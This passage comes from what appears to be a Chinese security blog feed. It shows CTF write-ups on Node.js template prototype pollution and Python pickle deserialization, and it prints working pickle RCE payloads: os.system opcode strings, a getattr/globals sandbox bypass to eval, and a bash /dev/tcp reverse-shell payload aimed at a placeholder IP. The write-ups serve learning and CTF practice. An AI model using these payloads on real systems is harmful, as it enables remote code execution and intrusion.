class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1 #&#123;title&#125;</span><br><span class="line">p Welcome to #&#123;title&#125;</span><br></pre></td></tr></table></figure><p>有继承的模板: 需要污染type</p></li></ul><p>顶格的<code>h= title</code>类型的: 污染block属性(title,name这些模板变量)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">h1&#x3D; title</span><br><span class="line">p hello #&#123;name&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>ejs:</p><ul><li><p><a href="https://xz.aliyun.com/t/6113"> XNUCA2019 Hardjs题解 从原型链污染到RCE </a></p></li><li><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: 从原型链污染到RCE</a></p></li></ul><p>jade:</p><ul><li><a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> nodejs </tag>
            
            <tag> jade </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过几道题目了解pickle反序列化</title>
      <link href="2021/02/20/%E9%80%9A%E8%BF%87%E5%87%A0%E9%81%93%E9%A2%98%E7%9B%AE%E4%BA%86%E8%A7%A3pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>2021/02/20/%E9%80%9A%E8%BF%87%E5%87%A0%E9%81%93%E9%A2%98%E7%9B%AE%E4%BA%86%E8%A7%A3pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>通过几道题了解pickle反序列化</p><h2 id="0x01-CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#0x01-CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="0x01 [CISCN2019 华北赛区 Day1 Web2]ikun"></a>0x01 [CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>最简单的<code>__reduce__</code>, (忽略别的一些知识点,只看pickle反序列化这部分.)</p><p>关键代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="comment"># ... ...</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line"><span class="comment"># ... ...</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        cmd = <span class="string">&#x27;cat /flag.txt&#x27;</span>  <span class="comment"># 要执行的命令</span></span><br><span class="line">        s = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&#123;&#125;&#x27;).read()&quot;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (s,))  <span class="comment"># reduce函数必须返回元组或字符串</span></span><br><span class="line"></span><br><span class="line">poc = pickle.dumps(genpoc())</span><br><span class="line">print(urllib.quote(poc))  <span class="comment"># 此时，如果 pickle.loads(poc)，就会执行命令</span></span><br></pre></td></tr></table></figure><p>参考 <a href="https://blog.csdn.net/xiayu729100940/article/details/105202964,%E8%BF%99%E7%AF%87%E6%96%87%E7%AB%A0%E7%BB%99%E5%87%BA%E4%BA%86%E5%87%A0%E4%B8%AApayload">https://blog.csdn.net/xiayu729100940/article/details/105202964,这篇文章给出了几个payload</a>.</p><h2 id="0x02-xctf高校战疫网络安全分享赛-webtmp"><a href="#0x02-xctf高校战疫网络安全分享赛-webtmp" class="headerlink" title="0x02 xctf高校战疫网络安全分享赛:webtmp"></a>0x02 xctf高校战疫网络安全分享赛:webtmp</h2><h3 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h3><p>题目给出了source.py,代码就不贴了.</p><p>从路由部分开始看:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line"><span class="comment"># ... 省略无关路由</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> base64.b64decode(pickle_data): <span class="comment"># 不能包含R字符</span></span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;No... I don\&#x27;t like R-things. No Rabits, Rats, Roosters or RCEs.&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = restricted_loads(base64.b64decode(pickle_data)) <span class="comment"># 被反序列化</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(result) <span class="keyword">is</span> <span class="keyword">not</span> Animal:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;Are you sure that is an animal???&#x27;</span></span><br><span class="line">            correct = (result == Animal(secret.name, secret.category)) <span class="comment"># 对比是否一致</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_result.html&#x27;</span>, result=result, pickle_data=pickle_data, giveflag=correct)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(<span class="built_in">repr</span>(e))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Something wrong&quot;</span></span><br><span class="line"></span><br><span class="line">    sample_obj = Animal(<span class="string">&#x27;一给我哩giaogiao&#x27;</span>, <span class="string">&#x27;Giao&#x27;</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(sample_obj)).decode()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;unpickle_page.html&#x27;</span>, sample_obj=sample_obj, pickle_data=pickle_data)</span><br></pre></td></tr></table></figure><p>可以看到ban掉了<code>R</code>, 且满足<code>type(result)==Animal</code>和<code>result == Animal(secret.name, secret.category)</code>就给flag. 但是并不知道<code>secret.name</code>和<code>secret.category</code>这两个变量,所以无法通过正常逻辑得到flag.</p><p>然后注意到<code>result = restricted_loads(base64.b64decode(pickle_data))</code> 这行代码存在pickle反序列化. 跟踪一下<code>restricted_loads</code>这个函数,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br></pre></td></tr></table></figure><p>发现进行pickle反序列化的时候只允许<code>__main__</code>模块</p><p>然后再看一下Animal类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, category</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Animal(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.category!r&#125;</span>)&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br></pre></td></tr></table></figure><p>对<code>__eq__</code>和<code>__repr__</code>进行了重写.</p><p>然后思考如何通过反序列化获得flag.</p><ol><li>直接获得secret里面的两个变量 / 覆盖掉它们</li><li>RCE获得flag.</li><li>读取文件获得secret.py (因为没回显所以就不考虑了)</li></ol><p>下面考虑1和2的可能性</p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><h4 id="main"><a href="#main" class="headerlink" title="__main__"></a>__main__</h4><p>对第一点需要知道怎么找到secret这个变量.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> __main__</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line">name=<span class="string">&#x27;lonmar&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">print(__main__.__dict__)</span><br></pre></td></tr></table></figure><p>运行上面的代码发现有secret这个模块.</p><p><img src="1613806007770.png" alt="1613806007770"></p><p>然后可以发现可以通过<code>__main__</code>找到secret里面的变量.</p><p><img src="1613806065382.png" alt="1613806065382"></p><p>并且可以做出修改</p><p>secret.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secret=<span class="string">&quot;this_is_the_secret_in_secret.py&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> __main__</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line">name=<span class="string">&#x27;lonmar&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">__main__.__dict__[<span class="string">&#x27;secret&#x27;</span>].__dict__[<span class="string">&#x27;secret&#x27;</span>] = <span class="string">&quot;testestestestestest&quot;</span></span><br><span class="line">print(secret.secret)</span><br><span class="line">    </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">testestestestestest</span></span><br><span class="line"><span class="string">[Finished in 0.1s]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>所以可以利用pickle反序列化进行变量的覆盖.</p><h4 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h4><p>然后开始编写opcode.(因为ban掉了R)</p><p>opcode编写参考 <a href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p><p>全部的opcode指令可以从 <a href="https://www.anquanke.com/post/id/188981%E6%89%BE%E5%88%B0">https://www.anquanke.com/post/id/188981找到</a>.</p><p>这里抄来几点tips</p><ul><li><code>c</code>操作符会尝试<code>import</code>库，所以在<code>pickle.loads</code>时不需要漏洞代码中先引入系统库。</li><li>pickle不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。pickle能够索引查值的操作只有<code>c</code>、<code>i</code>。而如何查值也是CTF的一个重要考点。</li><li><code>s</code>、<code>u</code>、<code>b</code>操作符可以构造并赋值原来没有的属性、键值对。</li></ul><p>找到secret.name和secret.category并通过b操作符赋值:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&quot;1&quot;</span></span><br><span class="line"><span class="string">S&quot;category&quot;</span></span><br><span class="line"><span class="string">S&quot;2&quot;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;__main__ secret&#x27;</span></span><br><span class="line">   <span class="number">17</span>: (    MARK</span><br><span class="line">   <span class="number">18</span>: S        STRING     <span class="string">&#x27;name&#x27;</span></span><br><span class="line">   <span class="number">26</span>: S        STRING     <span class="string">&#x27;1&#x27;</span></span><br><span class="line">   <span class="number">31</span>: S        STRING     <span class="string">&#x27;category&#x27;</span></span><br><span class="line">   <span class="number">43</span>: S        STRING     <span class="string">&#x27;2&#x27;</span></span><br><span class="line">   <span class="number">48</span>: d        DICT       (MARK at <span class="number">17</span>)</span><br><span class="line">   <span class="number">49</span>: b    BUILD</span><br><span class="line">   <span class="number">50</span>: .    STOP</span><br></pre></td></tr></table></figure><p><code>c</code>先引入<code>__main__.sercret</code>,在栈中第一个元素位置.</p><p><code>(</code>压入mark.</p><p><code>S</code>依次压入name,1,category,2</p><p><code>d</code>组成字典{‘name’:’1’,category’:2},且mark,name,1,category,2出栈,字典入栈.</p><p><code>b</code> 使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置 . 在这里就是操作secret.name和secret.category.(栈上第一个元素出栈</p><p>然后构造需要传入的animal对象:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&quot;1&quot;</span></span><br><span class="line"><span class="string">S&quot;2&quot;</span></span><br><span class="line"><span class="string">o.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>然后两个拼接即可. 因为要将Animal对象返回,所以赋值留下的一个元素需要pop掉(<code>0</code>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&quot;1&quot;</span></span><br><span class="line"><span class="string">S&quot;category&quot;</span></span><br><span class="line"><span class="string">S&quot;2&quot;</span></span><br><span class="line"><span class="string">db0(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&quot;1&quot;</span></span><br><span class="line"><span class="string">S&quot;2&quot;</span></span><br><span class="line"><span class="string">o.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">print(base64.b64encode(data))</span><br><span class="line"><span class="comment">#b&#x27;Y19fbWFpbl9fCnNlY3JldAooUyduYW1lJwpTIjEiClMiY2F0ZWdvcnkiClMiMiIKZGIwKGNfX21haW5fXwpBbmltYWwKUyIxIgpTIjIiCm8uCg==&#x27;</span></span><br></pre></td></tr></table></figure><p>tips : 也可以直接获取变量值,只不过opcode可能比较难写. 因为本道题限制了<code>__main__</code>模块</p><p>未限制<code>__main__</code>参考 <a href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a> 0x07全局变量包含：<code>c</code>指令码的妙用</p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>题目过滤了<code>R</code>,还可以用i和o进行RCE,这点比较容易绕过.</p><p>但是只允许<code>__main__</code>模块加载,这个就无法绕过了2333</p><p>所以RCE是失败的.但是换个思路,<strong>如果</strong>题目ban了<code>__main__</code>,堵住了变量覆盖这条路,就可以RCE</p><p>修改代码,尝试ban掉R后的RCE.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure><p>RCE demo:</p><p><code>R</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>i</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>o</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>另外,这篇文章里面<a href="https://zhuanlan.zhihu.com/p/89132768%E8%BF%98%E7%BB%99%E5%87%BA%E4%BA%86%E4%B8%80%E7%A7%8D%E4%BB%8E%E6%BA%90%E7%A0%81%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90%E5%BE%97%E5%88%B0%E7%9A%84ban%E6%8E%89%60R%60%E5%90%8E%E7%9A%84RCE%E6%96%B9%E6%B3%95,%E7%AE%80%E8%BF%B0">https://zhuanlan.zhihu.com/p/89132768还给出了一种从源码角度分析得到的ban掉`R`后的RCE方法,简述</a>:</p><p>先为对象加上一个<code> __setstate__</code> 属性:<code>&#123;&#39;__setstate__&#39;: os.system&#125; </code></p><p>然后再用一个字符串(cmd)build这个对象.原理就不赘述了,在文章里都有(只是没看懂build 字符串是什么操作)</p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb.&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x80\x03c__main__\nStudent\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nStudent\n)\x81&#125;(X\x04\x00\x00\x00nameX\x03\x00\x00\x00ruaX\x05\x00\x00\x00gradeX\x03\x00\x00\x00wwwub.&#x27;</span></span><br></pre></td></tr></table></figure><p> <img src="v2-5f6f6661a916b296e3fac6fbed8427cc_720w.jpg" alt="img"> </p><p>反弹shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xx.xxx/7777 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line">print(base64.b64encode(data))</span><br></pre></td></tr></table></figure><h2 id="0x03-Code-Breaking-picklecode"><a href="#0x03-Code-Breaking-picklecode" class="headerlink" title="0x03 Code-Breaking:picklecode"></a>0x03 Code-Breaking:picklecode</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>由于Django很不熟悉,所以就直接看着P牛文章分析了.<a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p><p>这道题目首先要关注的点就是配置文件,下面的配置文件很异常</p><p><img src="1613829560360.png" alt="1613829560360"></p><p>可以配合模板注入得到secret_key,然后伪造session,再精心构造opcode,绕过反序列化沙箱达到RCE目的.</p><p>下面主要看一下绕过反序列化沙箱部分,沙箱如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="comment"># ....</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"><span class="comment"># ....</span></span><br></pre></td></tr></table></figure><p>上面也是python官方给出的一种沙箱写法,但是find_class只会检查第一层的module.</p><p>可以通过getattr配合已经导入的builtins类绕过: <code>builtins.getattr(&#39;builtins&#39;, &#39;eval&#39;)</code></p><p>opcode:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="使用pker编写opcode"><a href="#使用pker编写opcode" class="headerlink" title="使用pker编写opcode"></a>使用pker编写opcode</h3><p>像上面的opcode写起来很费劲,有师傅写了更方便的opcode生成工具</p><p>项目地址 <a href="https://github.com/eddieivan01/pker">https://github.com/eddieivan01/pker</a> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getattr</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>)</span><br><span class="line"><span class="built_in">dict</span>=GLOBAL(<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;dict&#x27;</span>)</span><br><span class="line">dict_get=<span class="built_in">getattr</span>(<span class="built_in">dict</span>,<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">glo_dic=GLOBAL(<span 